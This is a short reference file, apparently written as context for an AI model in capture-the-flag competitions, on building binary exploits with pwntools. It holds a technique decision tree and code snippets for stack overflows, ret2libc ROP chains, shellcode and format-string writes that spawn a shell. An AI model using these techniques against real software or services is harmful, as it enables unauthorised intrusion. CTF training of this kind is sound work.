# pwntools: Context for Claude

Quick competition reference. pwntools runs via the terminal (`python expl.py` / `python expl.py
REMOTE`). The role here is to **choose the technique from `checksec` + the decompile, build the
exploit, and switch local→remote**.

## Decision tree (after checksec)

```
Canary present?
 ├─ yes → no direct overflow; look for a canary leak (format string / off-by) first
 └─ no → you can overwrite the return address:
     Is there a win/system/flag function in the binary?
      ├─ yes → ret2win (flat({offset: win}))  [+ret to align if it closes on its own]
      └─ no → is NX on?
          ├─ yes → ret2libc: leak puts@GOT via puts@PLT → libc base → system("/bin/sh")
          │         (or one_gadget if the chain gets tight)
          └─ no → shellcode on the stack (asm(shellcraft.sh()), jmp to the buffer)
PIE on? → you need a leak of the binary itself before using elf.sym
```

Format string (`printf(user_input)` with no format): leak stack/libc with `%p`/`%N$p`, write with
`%n`: pwntools has `fmtstr_payload(offset, {addr: value})`.

## Quick-reference snippets

```python
from pwn import *
context.binary = elf = ELF("./chall")          # sets arch/bits/endian
io = remote("H", P) if args.REMOTE else process(elf.path)

# packing
p64(0xdeadbeef); u64(x.ljust(8, b"\x00")); flat({offset: [g1, g2]})

# offset via cyclic
io.sendline(cyclic(200)); io.wait()
offset = cyclic_find(io.corefile.read(io.corefile.rsp, 8))

# ROP
rop = ROP(elf); pop_rdi = rop.find_gadget(["pop rdi","ret"])[0]; ret = rop.find_gadget(["ret"])[0]

# libc
libc = ELF("./libc.so.6"); libc.address = leak - libc.sym["puts"]
binsh = next(libc.search(b"/bin/sh")); libc.sym["system"]

# I/O
io.recvuntil(b"> "); io.sendline(b"x"); io.recvline(); io.interactive()
```

## Common failure modes (and the cause)

| Symptom | Likely cause |
|---|---|
| Exploit works locally, fails remotely | Different libc: use the challenge's (`pwninit`/`LD_PRELOAD`) |
| Shell opens and closes immediately | Misaligned stack: insert a `ret` gadget before `system` |
| `p64`/addresses come out wrong | Wrong `context.arch`/bits: set `context.binary` |
| `EOFError` on receive | Synchronization: use `recvuntil(prompt)`, not a fixed `recv(n)` |
| ROP can't find a gadget | `No PIE` required, or the gadget is only in libc (build with the libc base) |

## When to flag that PWN isn't the vector

- A binary with `Full RELRO` + canary + PIE and no obvious leak in a challenge marked "easy": it
  may be REV in disguise (finding the static flag in the binary) rather than exploitation.
- No remote service and no flag on the local FS: reread the prompt; the target may be to
  understand the logic (REV), not to get a shell.
